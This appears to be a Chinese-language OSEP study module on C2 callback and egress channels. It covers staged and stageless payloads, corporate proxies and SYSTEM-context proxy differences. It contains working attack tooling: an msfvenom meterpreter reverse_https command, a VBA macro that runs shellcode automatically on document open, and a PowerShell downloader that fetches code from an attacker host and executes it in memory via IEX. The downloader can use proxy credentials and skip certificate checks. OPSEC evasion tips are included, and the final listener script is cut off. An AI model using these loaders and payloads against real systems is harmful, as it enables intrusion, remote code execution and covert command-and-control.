::: warning 仅限授权使用
本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
:::

# 09 · C2 回连与出网通道（分阶段 / 代理 / DNS / 域前置）

> **覆盖场景：** 17、28、29、30、31、32、33
>
> **前置依赖：** 攻击机（Kali）+ 一个入口会话；HTTPS 需自签证书（生成见 [00-environment-and-infra](/zh/modules/00-environment-and-infra) §3）；DNS 通道需一个可把 NS 指向你的域或实验网允许的直连 UDP 53；域前置需可自定义 Host 转发的 CDN/自建 nginx 前端。

**核心思想**：本模块解决"代码能跑但会话/第二阶段回不来"的问题。所有方案都围绕一条**已验证可达的通信路径**展开——先验证路径（投递、代理、DNS 解析、TLS 握手），再让每个阶段走同一条路径。任何阶段换了地址/端口/协议/代理上下文，都是场景 30 的翻版。

---

## 场景 17：目标没有稳定出网能力，下载式第二阶段无法取得

**场景回顾**：入口能执行代码，但目标访问不到文件服务器、只放行少数地址，依赖临时下载的宏/脚本/加载器全部失败。

**前提与假设**：有可执行代码的入口（VBA / HTA / JScript，见 M01–M03）；我方把第二阶段放在外网文件服务器上；目标侧 DNS 解析或任意出网到该服务器失败；shellcode 与 runner 已就绪。

**准备（攻击机侧）**：把每种入口的 payload 都做成**两套并存**：内嵌版（shellcode + runner 全在单文件/单次进程内完成，0 次外部下载）与下载版（stager → 从攻击机取第二阶段）。不要只留一种，考试里切换形态重做非常费时。

```bash
# 内嵌版准备：生成 shellcode（先确认目标位数，x86/x64 分开存）
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=LHOST LPORT=LPORT EXITFUNC=thread -f ps1 > ~/osep/payloads/win/x64/run.ps1
# 把 shellcode 段粘进 runner（M01/M03 的内嵌 runner 预留了 INSERT SHELLCODE HERE 注释位）
# 下载版准备：第二阶段放投递服务器
cp ~/osep/payloads/win/x64/run.ps1 ~/osep/payloads/PAYLOAD
python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads   # 请求日志确认"是否真的下载"
```

**执行步骤**：
1. 先用无害回调确认入口执行（回调 ping / nslookup / 写文件，见 M01），**不要**直接跑下载版——如果回调都出不去，下载必然失败。
2. 确认目标出网能力：从目标侧 `Test-NetConnection LHOST -Port 80/443`、`nslookup URL`，记录哪条路径通。
3. 能出网 → 用下载版 stager（文档 `docs/01` 场景 3、`docs/03` 场景 9 的下载执行形态）；不能 → 换内嵌版，把第二阶段直接内嵌进 runner 单文件投递。
4. 内嵌版仍太大/被杀（场景 18–19）→ 用 M03 的"桥接 + C# 第二阶段"把重量级逻辑挪到内存内 JScript/C#，仍不落地不下载。
5. 投递后观察 m00 服务器日志（有无 GET）与监听端（会话是否建立）。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m00-delivery-server.py` | 下载版的投递 + 请求日志 | `--port 80 --dir ~/osep/payloads` |
| `m01-shellcode-runner-vba-archbranch.vba` | 内嵌版参考（先判位数再选 shellcode） | 粘 shellcode 段 |
| `m03-dotnettojscript-loader.js` | 内嵌第二阶段的桥接参考 | 粘 C# payload |
| `m09-proxy-aware-downloader.ps1` | 下载走系统代理时的下载器 | 见场景 28 |

#### `m00-delivery-server.py`

````python
#!/usr/bin/env python3
"""用途：投递服务器——HTTP/HTTPS 双通道，记录每个请求的来源、User-Agent、路径，用于确认"目标是否真的下载了"

场景：通用基础设施（配合 docs/00-environment-and-infra.md；支撑场景 3、8、15、16、17、28、30、31 的投递与排错）

依赖：Python 3.7+（标准库）；HTTPS 需要 cert/key（可用 openssl 或 m00-build-payloads.sh 生成）

使用：
    # HTTP（默认 80）
    python3 m00-delivery-server.py --port 80 --dir ~/osep/payloads

    # HTTPS（自签）
    python3 m00-delivery-server.py --port 443 --dir ~/osep/payloads \
        --cert ~/osep/tools/cert.pem --key ~/osep/tools/key.pem

    # 只做探测模式：不返回文件，只记录请求（确认目标出网路径）
    python3 m00-delivery-server.py --port 8000 --probe-only

占位符：LHOST=攻击机 IP（脚本会打印可用 URL）；PAYLOAD=放在 --dir 下的载荷文件名

测试状态：已在 macOS 本机用 Python 3 语法校验（py_compile）；HTTP 模式可直接运行验证
"""
from __future__ import annotations

import argparse
import datetime
import http.server
import os
import socket
import ssl
import sys
import threading

class LoggedHandler(http.server.SimpleHTTPRequestHandler):
    """带结构化日志的静态文件服务；probe-only 模式只记录不返回文件。"""

    probe_only = False
    log_path = "delivery.log"
    server_version = "DeliveryServer/1.0"
    _lock = threading.Lock()

    def _client(self) -> str:
        return f"{self.client_address[0]}:{self.client_address[1]}"

    def _record(self, method: str, status: int, note: str = "") -> None:
        stamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        line = f"{stamp}\t{self._client()}\t{method}\t{self.path}\t{status}\t{host}\t{ua}\t{note}"
        with self._lock:
            with open(self.log_path, "a", encoding="utf-8") as fh:
                fh.write(line + "\n")
        print(line, flush=True)

    def do_GET(self):  # noqa: N802
        if self.probe_only:
            self._record("GET", 200, "probe-only")
            body = b"ok\n"
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
            return
        self._record("GET", 200)
        super().do_GET()

    def do_POST(self):  # noqa: N802
        length = int(self.headers.get("Content-Length", 0) or 0)
        data = self.rfile.read(length) if length else b""
        self._record("POST", 200, f"body={data[:200]!r}")
        body = b"ok\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_HEAD(self):  # noqa: N802
        self._record("HEAD", 200)
        super().do_HEAD()

    def log_message(self, fmt, *args):  # 抑制默认 stderr 输出，统一走 _record
        return

def local_ips() -> list[str]:
    ips = set()
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None, socket.AF_INET):
            ips.add(info[4][0])
    except Exception:
        pass
    # 兜底：探测默认路由出口地址
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ips.add(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    return sorted(ip for ip in ips if not ip.startswith("127."))

def main() -> int:
    ap = argparse.ArgumentParser(description="OSEP 投递服务器（HTTP/HTTPS + 请求日志）")
    ap.add_argument("--port", type=int, default=80)
    ap.add_argument("--bind", default="0.0.0.0")
    ap.add_argument("--dir", default=os.path.expanduser("~/osep/payloads"))
    ap.add_argument("--cert", default="")
    ap.add_argument("--key", default="")
    ap.add_argument("--log", default="", help="日志路径，默认 <dir>/../logs/delivery.log")
    ap.add_argument("--probe-only", action="store_true", help="只记录请求，不返回文件")
    args = ap.parse_args()

    root = os.path.abspath(os.path.expanduser(args.dir))
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
    log_path = args.log or os.path.join(os.path.dirname(root), "logs", "delivery.log")
    os.makedirs(os.path.dirname(log_path), exist_ok=True)

    LoggedHandler.probe_only = args.probe_only
    LoggedHandler.log_path = log_path

    handler = lambda *a, **kw: LoggedHandler(*a, directory=root, **kw)  # noqa: E731
    httpd = http.server.ThreadingHTTPServer((args.bind, args.port), handler)

    scheme = "http"
    if args.cert and args.key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(certfile=os.path.expanduser(args.cert), keyfile=os.path.expanduser(args.key))
        httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
        scheme = "https"

    print(f"[*] 投递根目录: {root}")
    print(f"[*] 请求日志:   {log_path}")
    print(f"[*] 模式:       {'probe-only（只记录）' if args.probe_only else '文件投递'}")
    print("[*] 可用地址:")
    for ip in local_ips():
        print(f"      {scheme}://{ip}:{args.port}/PAYLOAD")
    print("[*] Ctrl+C 停止")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] 已停止")
    finally:
        httpd.server_close()
    return 0

if __name__ == "__main__":
    sys.exit(main())
````

#### `m01-shellcode-runner-vba-archbranch.vba`

````vb
' 用途：用 VBA 编译期常量自动匹配 Office 位数，避免投递位数不匹配的 Runner 导致宿主崩溃
' 场景：1（位数未知时的"一把梭"版本）
' 依赖：Office；x64 与 x86 两套 shellcode（各自 XOR 编码）
' 使用：把两段 shellcode 分别填进 GetX64Shellcode / GetX86Shellcode，粘进 ThisDocument 后另存为 .docm
' 占位符：SHELLCODE_X64、SHELLCODE_X86（字节数组）、XOR_KEY
' 测试状态：未在 Windows 实测；已人工核对 #If Win64 编译期分支写法
'
' 说明：VBA 的 #If Win64 是**编译期**常量，Office 加载宏时就知道自己是 32 还是 64 位，
'       因此同一个 .docm 可以在两种 Office 上都能跑对分支——比运行时 WMI 探测更可靠。
Option Explicit

Private Const XOR_KEY As Byte = &H2A

#If VBA7 Then
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As LongPtr, ByVal dwStackSize As LongPtr, _
        ByVal lpStartAddress As LongPtr, ByVal lpParameter As LongPtr, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr
    Private Declare PtrSafe Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As LongPtr)
    Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As LongPtr, ByVal dwMilliseconds As Long) As Long
#Else
    Private Declare Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As Long, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function CreateThread Lib "kernel32" ( _
        ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As Long, ByVal lpParameter As Long, _
        ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
    Private Declare Sub RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long)
    Private Declare Function WaitForSingleObject Lib "kernel32" ( _
        ByVal hHandle As Long, ByVal dwMilliseconds As Long) As Long
#End If

Sub RunShellcode()
    Dim sc() As Byte, i As Long

    #If Win64 Then
        sc = GetX64Shellcode()      ' 64 位 Office → x64 shellcode
    #Else
        sc = GetX86Shellcode()      ' 32 位 Office → x86 shellcode
    #End If

    For i = LBound(sc) To UBound(sc)
        sc(i) = sc(i) Xor XOR_KEY
    Next i

    Dim mem As LongPtr, hThread As LongPtr
    mem = VirtualAlloc(0, UBound(sc) + 1, &H3000, &H40)
    If mem = 0 Then Exit Sub
    RtlMoveMemory mem, sc(0), UBound(sc) + 1

    hThread = CreateThread(0, 0, mem, 0, 0, 0)
    If hThread = 0 Then Exit Sub
    WaitForSingleObject hThread, 1000
End Sub

Private Function GetX64Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX64Shellcode = tmp
End Function

Private Function GetX86Shellcode() As Byte()
    Dim tmp(3) As Byte
    tmp(0) = &H1B: tmp(1) = &H1B: tmp(2) = &H1B: tmp(3) = &H1B
    GetX86Shellcode = tmp
End Function

Sub AutoOpen()
    RunShellcode
End Sub

Sub Document_Open()
    RunShellcode
End Sub
````

#### `m03-dotnettojscript-loader.js`

````javascript
/*
 * 用途：DotNetToJScript 桥接产物的骨架/粘贴容器 + 宿主预检。
 *      DotNetToJScript.exe 会把 C# 程序集序列化生成完整 runner.js（几百行 base64），
 *      本文件用于：(a) 记录标准生成命令；(b) 在投递前做宿主位数/.NET 预检；
 *      (c) 需要手工拼装时，把工具输出整体粘贴到下方"粘贴区"。
 * 场景：9、10（cheat sheet JScript > Meterpreter Loader with DotNetToJScript）
 * 依赖：工具机 Windows + DotNetToJScript.exe；目标 WSH + .NET（v4 或 v2）。
 * 使用：
 *  1) 生成完整产物（产物本身可独立运行，无需本文件）：
 *       DotNetToJScript.exe .\payload.dll --lang=Jscript --ver=v4 -o runner.js
 *  2) 本地预检（把产物与本文件放同目录后执行本文件即可看宿主信息）：
 *       cscript //nologo m03-dotnettojscript-loader.js
 *  3) 若需手工粘贴：把工具输出的全部内容贴进下方 PASTE_BEGIN/PASTE_END 之间，
 *     保存后 cscript 运行。
 * 占位符：无（宿主信息自动读取）；粘贴区内为工具产物，勿手改 base64。
 * 测试状态：宿主预检逻辑已做 JS 语法校验(node --check)；
 *     产物生成/激活需在 Windows 实验环境验证。
 */

// ===================== 宿主预检（只读，不改产物） =====================
var fso = new ActiveXObject("Scripting.FileSystemObject");
var env = new ActiveXObject("WScript.Shell").Environment("Process");

WScript.Echo("[*] 宿主          : " + WScript.FullName);
WScript.Echo("[*] OS 体系结构   : " + env("PROCESSOR_ARCHITECTURE"));
// 宿主位数决定能加载的程序集平台：64 位宿主 -> x64/AnyCPU；32 位宿主 -> x86/AnyCPU
if (env("PROCESSOR_ARCHITECTURE") === "x86" &&
    env("PROCESSOR_ARCHITEW6432") === "AMD64") {
    WScript.Echo("[!] 本进程是 32 位(运行于 x64 OS)——载荷需 x86 或 AnyCPU");
}

// .NET 版本目录探测：v4 默认存在；v2/v3.5 需功能启用
var windir = env("WINDIR");
var net4 = windir + "\\Microsoft.NET\\Framework64\\v4.0.30319";
var net2 = windir + "\\Microsoft.NET\\Framework64\\v2.0.50727";
WScript.Echo("[*] .NET v4 目录  : " + (fso.FolderExists(net4) ? "存在" : "缺失"));
WScript.Echo("[*] .NET v2 目录  : " + (fso.FolderExists(net2) ? "存在" : "缺失"));
if (!fso.FolderExists(net4) && !fso.FolderExists(net2)) {
    WScript.Echo("[!] 未发现 .NET Framework 目录，DotNetToJScript v4/v2 产物均无法运行");
    WScript.Quit(1);
}

// ===================== 粘贴区 =====================
// 把 DotNetToJScript 生成的完整 JS 内容粘贴到此处（含其自身开头的
// var serialized_obj = "..." 与后续反序列化/激活代码），并删除下面两行占位。
// 注意产物本身与宿主位数/.NET 版本的匹配（v2 产物需要 .NET 2.0/3.5）。
// PASTE_BEGIN
WScript.Echo("[*] 粘贴区为空：请先运行 DotNetToJScript 生成产物，");
WScript.Echo("[*] 或直接把产物 runner.js 作为附件投递（推荐，勿手工改）。");
WScript.Echo("[*] 上方宿主信息用于确认产物平台(--ver/编译平台)是否匹配。");
// PASTE_END

WScript.Quit(0);
````

#### `m09-proxy-aware-downloader.ps1`

````powershell
<#
# 用途：代理感知的下载/执行器。自动读取系统代理（WinINet 用户上下文）或使用显式代理下载 URL，
#       支持代理认证（当前令牌透传 NTLM 或明文凭据）。可仅落地文件、内存执行或直接 IEX 内容。
#       覆盖场景：28（系统代理 + 代理认证）、29（用户态与 SYSTEM 上下文代理差异）、
#       30（下载式第二阶段的代理路径）、31（HTTPS + 证书校验开关）。
# 依赖：PowerShell 5.1+（Windows）；无需额外模块。目标需能经代理访问攻击机 URL。
# 使用：
#   1) 自动系统代理下载到文件：
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/PAYLOAD -OutFile C:\Windows\Temp\PAYLOAD
#   2) 自动系统代理下载并内存执行（stager 用法，IEX）：
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/stage2.ps1 -Command
#   3) 显式代理 + 明文认证：
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url https://LHOST/PAYLOAD -OutFile x.bin `
#          -ProxyUrl http://proxy.corp:8080 -ProxyUser DOMAIN\USER -ProxyPass PASS
#   4) 显式代理 + 当前令牌认证（NTLM 透传，域用户场景常用）：
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/stage2.ps1 -Command `
#          -ProxyUrl http://proxy.corp:8080 -DefaultCreds
#   5) 只做连通性测试（下载 8 字节并报告代理选择），不改动系统设置：
#      powershell -ep bypass -f m09-proxy-aware-downloader.ps1 -Url http://LHOST/probe.txt -TestOnly
# 占位符：LHOST=攻击机 IP，LPORT=端口，PAYLOAD=投递文件名，DOMAIN\USER / PASS=代理凭据，URL=https?://LHOST[:LPORT]/PAYLOAD
# 测试状态：本机未做 Windows 实测（无 Windows 环境），仅做了语法级检查；逻辑对照场景 28/29 的实验结果编写，
#           需在实验网用户上下文与 SYSTEM 上下文分别验证。SYSTEM 上下文注意：netsh winhttp 与 HKCU 不互通。
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)][string]$Url,
    [string]$OutFile = "",
    [switch]$Command,          # 下载内容直接 IEX（内存执行，不落地）
    [switch]$TestOnly,         # 只探测连通性：下载小文件并报告所用代理，不执行内容
    [string]$ProxyUrl = "",    # 显式代理 http://host:port（优先级高于系统代理）
    [string]$ProxyUser = "",   # 代理认证用户（DOMAIN\user 或 user）
    [string]$ProxyPass = "",
    [switch]$DefaultCreds,     # 用当前进程令牌做代理认证（NTLM 透传）
    [switch]$SkipCertCheck,    # 跳过 TLS 证书校验（自签证书时用；仅在目标无 MITM 检查时可过）
    [int]$TimeoutSec = 20
)

$ErrorActionPreference = "Stop"

# ---- TLS 1.2 + 可选证书校验跳过 ----
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
if ($SkipCertCheck) {
    Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
    [Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
}

function Get-EffectiveProxy([string]$targetUrl) {
    # 优先级：显式 ProxyUrl > 系统代理（WinINet/HKCU）> 直连
    if ($ProxyUrl) {
        $p = New-Object Net.WebProxy($ProxyUrl)
        $p.BypassProxyOnLocal = $false
        return $p
    }
    try {
        $sys = [Net.WebRequest]::GetSystemWebProxy()
        $sys.Credentials = [Net.CredentialCache]::DefaultCredentials
        $u = $sys.GetProxy([uri]$targetUrl)
        if ($u -and $u.AbsoluteUri -ne $targetUrl) { return $sys }
    } catch { Write-Warning "[!] 读取系统代理失败（可能无 HKCU 代理设置）: $($_.Exception.Message)" }
    Write-Host "[*] 未发现系统代理，将直连 $targetUrl" -ForegroundColor Cyan
    return $null
}

Write-Host "[*] 目标 URL : $Url"
Write-Host "[*] 当前身份 : $([Environment]::UserDomainName)\$([Environment]::UserName)  (SYSTEM 上下文时注意代理差异)"

$wc = New-Object Net.WebClient
$proxy = Get-EffectiveProxy $Url
if ($null -ne $proxy) {
    if ($DefaultCreds) { $proxy.Credentials = [Net.CredentialCache]::DefaultCredentials }
    elseif ($ProxyUser) {
        if ($ProxyUser -match '\\') {
            $d, $u = $ProxyUser.Split('\')
            $proxy.Credentials = New-Object Net.NetworkCredential($u, $ProxyPass, $d)
        } else {
            $proxy.Credentials = New-Object Net.NetworkCredential($ProxyUser, $ProxyPass)
        }
    }
    $wc.Proxy = $proxy
    Write-Host "[*] 使用代理 : $($proxy.Address)" -ForegroundColor Cyan
} else {
    $wc.Proxy = $null   # 直连
}
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

try {
    if ($TestOnly) {
        # 探测模式：请求 HEAD/小 GET，只关心是否到达攻击机（配合 m00-delivery-server 日志核对）
        $resp = $wc.DownloadData($Url)
        Write-Host "[+] 连通性 OK：收到 $($resp.Length) 字节 (来自 $Url)" -ForegroundColor Green
        exit 0
    }
    if ($Command) {
        Write-Host "[*] 内存下载并执行 : $Url"
        $code = $wc.DownloadString($Url)
        Write-Host "[+] 已取得内容 $($code.Length) 字符，开始 IEX ..." -ForegroundColor Green
        Invoke-Expression $code
    } elseif ($OutFile) {
        Write-Host "[*] 下载到文件 : $OutFile"
        $dir = Split-Path -Parent $OutFile
        if ($dir -and -not (Test-Path $dir)) { New-Item -ItemType Directory -Path $dir -Force | Out-Null }
        $wc.DownloadFile($Url, $OutFile)
        if ((Get-Item $OutFile).Length -gt 0) {
            Write-Host "[+] 已保存 $(Get-Item $OutFile).Length 字节 -> $OutFile" -ForegroundColor Green
        } else {
            Write-Error "[-] 文件为空，下载可能被代理/服务器拦截"
        }
    } else {
        Write-Error "[-] 请指定 -OutFile、-Command 或 -TestOnly 三者之一"
    }
} catch [Net.WebException] {
    $code = $_.Exception.Response.StatusCode.value__
    if ($code -eq 407) {
        Write-Host "[-] 代理认证失败(407)：尝试 -DefaultCreds（NTLM 透传）或 -ProxyUser DOMAIN\USER -ProxyPass PASS" -ForegroundColor Red
    } elseif ($code -eq 403) {
        Write-Host "[-] 被代理/服务器拒绝(403)：换 UA/路径，或确认该 URL 是否被白名单放行（场景 31/33）" -ForegroundColor Red
    } else {
        Write-Host "[-] 请求失败 HTTP $code : $Url（直连不通时检查系统代理，场景 28）" -ForegroundColor Red
    }
    Write-Host "[-] 细节 : $($_.Exception.Message)" -ForegroundColor Red
    if ($_.Exception.InnerException) { Write-Host "[-] 内层 : $($_.Exception.InnerException.Message)" }
    exit 1
} catch {
    Write-Host "[-] 未预期错误 : $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
````

**验证**：m00 日志出现目标 IP 的 GET → 下载链路通；监听端出现会话 → 完整链路通；无任何日志/会话时对照"回调三件套"确认是入口没执行还是出网被拦。

**失败分支与备选**：
- 目标完全无出网（含 DNS 出网都不通）→ 放弃回连类方案，改"离线落地型"：落地+计划任务/服务常驻，把结果写文件由别的入口取回（M01 场景 5）。
- 只放行少数域名/端口 → 走代理（场景 28）或域前置（场景 33）或 HTTPS 443（场景 31）。
- 内嵌版被执行但秒退 → 位数不匹配或 shellcode 生成时架构错误，用 archbranch 版本（M01）。

**考试注意 / OPSEC**：内嵌与下载两版在**不同目录**保存并注释清楚，避免投错文件浪费 10 分钟；内嵌 shellcode 默认有静态特征，需要时按 M05 编码/加密；"能执行代码 ≠ 能出网"，先验证路径再跑 payload。

---

## 场景 28：普通用户能通过浏览器联网，自定义 payload 无法直接回连

**场景回顾**：目标只允许经企业代理访问外网，浏览器正常，直接 TCP 或忽略代理的 HTTP 客户端失败。

**前提与假设**：有普通用户会话并能执行 PowerShell；目标配置了系统/用户代理（HKCU Internet Settings 或浏览器内置代理）；代理可能需要 NTLM 认证（域用户上下文通常能透传）。

**准备（攻击机侧）**：起投递服务器/HTTPS 监听（m00 或 m09-https-listener.sh）；从目标侧先读代理配置，确认走代理是否就能到你的地址。

```powershell
# 目标侧：读用户代理设置（WinINet）
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable
```

**执行步骤**：
1. 用 `m09-proxy-aware-downloader.ps1` 做连通性测试：默认模式自动取系统代理并下载一个无害文件（m00 日志里能看到 GET）。
2. 407（代理认证失败）→ 加 `-ProxyUser DOMAIN\USER -ProxyPass PASS`（或 `-DefaultCreds` 用当前令牌透传 NTLM）。
3. 确认能下载后，把同一路径用于回连：HTTPS reverse handler 的端口/地址要走得到（443 最稳）；PowerShell stager 下载执行也加同样的代理参数。
4. 记录"用户上下文 + 代理 → 通"，为场景 29 做对照。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m09-proxy-aware-downloader.ps1` | 系统代理/显式代理下载，支持认证 | `-Url http://LHOST/PAYLOAD -OutFile` 或 `-Command` |
| `m00-delivery-server.py` | 投递 + 确认目标请求 | `--port 80 --dir ~/osep/payloads` |

**验证**：m00 日志出现来自代理/目标的 GET；`-Command` 模式下载的脚本执行后有回调输出；测试文件内容与源一致。

**失败分支与备选**：
- 浏览器用内置代理（Firefox 单独配置）而系统代理为空 → 从浏览器设置里读出代理地址，改用显式 `-ProxyUrl http://proxy:port`。
- 代理要认证且当前令牌不过 → 用已知凭据 `-ProxyUser/-ProxyPass`；只有明文 HTTP 代理时凭据会暴露给代理，尽量让流量是 HTTPS。
- 代理只放行白名单域名 → 域前置（场景 33）或 DNS（场景 32）。

**考试注意 / OPSEC**：代理日志能看到目的 URL → 下载阶段用无特征文件名，回连阶段走 HTTPS；同一会话里保持 UA 一致（m09 脚本默认带浏览器 UA）；不要把域凭据明文留在命令行历史里，必要时用 `-DefaultCreds`。

---

## 场景 29：用户权限会话能回连，提升为 SYSTEM 后却失联

**场景回顾**：同一台机器、同一个地址，提权前通信正常，SYSTEM 身份下失败——两种身份用的代理设置和认证上下文不同。

**前提与假设**：已从用户会话提权到 SYSTEM（服务、计划任务、令牌复制等入口）；企业出网必须经代理；用户态代理配置在 HKCU（WinINet），SYSTEM 默认走 WinHTTP（`netsh winhttp`），两者**不共享**，且 SYSTEM 没有用户的认证凭据上下文。

**准备（攻击机侧）**：起监听；在目标侧先对比两条代理链的输出：

```cmd
rem 目标侧（用户 shell）
netsh winhttp show proxy          rem SYSTEM/机器级 WinHTTP 代理设置
reg query "HKCU\...\Internet Settings" /v ProxyServer   rem 用户 WinINet 设置

rem SYSTEM 上下文（服务入口或 PsExec -s 后）
whoami                            rem 确认 nt authority\system
netsh winhttp show proxy
```

**执行步骤**：
1. 提权前记录"用户 + 代理"能通的证据（场景 28 的输出）。
2. 提权后先做最小验证：SYSTEM 下直接 TCP/下载是否通。若不通，查 WinHTTP 代理是否为空/与用户不一致。
3. 方案 A（改机器代理，需管理员，SYSTEM 已具备）：`netsh winhttp set proxy proxy-server="http://proxy:8080" bypass-list="<local>"`，先记下 `netsh winhttp show proxy` 原值便于回滚，用毕 `netsh winhttp reset proxy`。
4. 方案 B（不改机器）：SYSTEM 会话里用支持显式代理参数的下载器/客户端（`m09-proxy-aware-downloader.ps1 -ProxyUrl ... -ProxyUser ...`），让每个组件自己带代理。
5. 方案 C（认证上下文问题）：若代理对 SYSTEM 的匿名/NTLM 认证失败，把需要出网的 payload 放回用户上下文执行（如计划任务以用户身份跑），或走不需要代理认证的通道（DNS 场景 32）。
6. 回连路径通了再让 handler 进入第二阶段，全程记录代理参数。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m09-proxy-aware-downloader.ps1` | 双上下文下载器；SYSTEM 下用显式代理 | `-ProxyUrl http://proxy:8080 -DefaultCreds` |
| `m00-delivery-server.py` | 验证 SYSTEM 是否真的请求到投递地址 | `--port 80` |

**验证**：SYSTEM 上下文下 m00 日志出现 GET；或 `netsh winhttp show proxy` 显示代理已设置后回连成功；对照组（改前/改后）输出差异要能解释。

**失败分支与备选**：
- 不允许改机器代理（会破坏系统服务出网）→ 用 M08 隧道：在目标可达位置做转发，让流量经用户上下文/跳板。
- 代理对 SYSTEM 无可用凭据 → 用户上下文派生一个带凭据的进程执行出网段，或换 DNS 通道。
- 提权入口本身就是服务重启等无交互形态 → 把代理参数写死在 payload 命令行里再触发。

**考试注意 / OPSEC**：`netsh winhttp set proxy` 影响**整机**，考试网络里可能影响其他服务甚至被判为破坏——一定先保存原值、用完 reset；SYSTEM 回连尽量 443/80 常规端口；把"用户 vs SYSTEM"两条路径各测一次并记录，别在 SYSTEM 下反复试用户态的参数浪费时间。

---

## 场景 30：第一阶段回连成功，第二阶段始终没有出现

**场景回顾**：入口成功联系监听端，但后续阶段用了另一地址/端口/协议，那条路径不被目标允许，或根本没被配置。

**前提与假设**：第一阶段（stager/回调）已通；监听与投递基础设施在攻击机侧已按 `docs/00` 固定端口规划（80 投递、443 回连、4444 备用）。

**准备（攻击机侧）**：给每个会话建一张"路径卡片"，字段固定：入口 → 下载地址/协议/端口 → 监听地址/协议/端口 → 代理上下文 → UA。任何阶段换路径先改卡片再执行。

**执行步骤**：
1. 定位断点：第二阶段如果是"下载执行"，看 m00/nginx 日志有没有来自目标的第二阶段 GET；没有 → 目标没走到下载地址；有但无会话 → 执行/位数问题（转 M05）。
2. 常见根因逐条排除：
   - 地址不一致：stager 里写的 LHOST 是内网地址或 localhost，监听在另一张网卡 —— 统一用同一张网卡 IP。
   - 端口不一致：生成 payload 时 LPORT=4444，监听开在 443。
   - 协议不一致：第一阶段 HTTP 通，第二阶段 reverse_https 被出口拦 → 全阶段用已验证协议（443/HTTPS 或代理路径）。
   - 代理上下文：第一阶段在用户上下文能下载，第二阶段由 SYSTEM 触发（见场景 29）。
   - 投递服务器没起 / 目录名错 / `PAYLOAD` 文件名大小写或路径不一致。
3. 最稳做法：**stageless**（一次连接带全部）替代 staged（先连再取），避免第二阶段天生依赖第二条路径；必须 staged 时两阶段走同一投递服务器同一条 URL 模板。
4. 监听端设置 `set ExitOnSession false`，避免第一个会话断了就关掉整个 handler。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m09-https-listener.sh` | 统一 HTTPS/HTTP handler 入口 | `--mode msf --payload windows/x64/meterpreter/reverse_https` |
| `m00-delivery-server.py` | 第二阶段投递 + 请求日志 | `--port 80 --dir ~/osep/payloads` |
| `m09-proxy-aware-downloader.ps1` | 第二阶段下载若需走代理 | `-Url http://LHOST/PAYLOAD -Command` |

#### `m09-https-listener.sh`

````bash
#!/usr/bin/env bash
# 用途：攻击机侧 HTTPS 监听 / TLS 终止转发 / HTTPS 投递的统一入口
#       —— openssl 生成自签证书，socat / stunnel / sslh / python3 起 TLS 监听并转发到本地 handler
# 场景：31（目标只允许 HTTPS 且 TLS 握手或请求被检查）、30（分阶段通信统一走 443）、
#       33（域前置里的后端 HTTPS 监听/投递）、15/17（需要 HTTPS 投递第二阶段时）
# 依赖：openssl（必选，生成证书与探测）；
#       转发工具按优先级自动挑选：socat > stunnel4 > python3（内置 ssl 转发，零安装）；
